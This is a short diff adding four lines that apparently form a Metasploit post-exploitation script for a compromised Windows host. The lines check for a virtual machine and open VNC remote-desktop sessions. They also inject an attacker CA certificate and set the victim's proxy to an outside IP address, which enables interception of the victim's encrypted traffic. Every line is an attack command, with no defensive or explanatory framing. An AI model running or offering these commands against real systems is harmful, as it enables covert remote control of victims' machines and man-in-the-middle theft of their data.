@@ -1,0 +1,4 @@
+run post/windows/gather/checkvm
+run vnc
+run vnc
+run post/multi/manage/upload_injectCA LFILE='/root/Desktop/ca.cer' ProxyServer=14.175.229.131 ProxyPort=8080
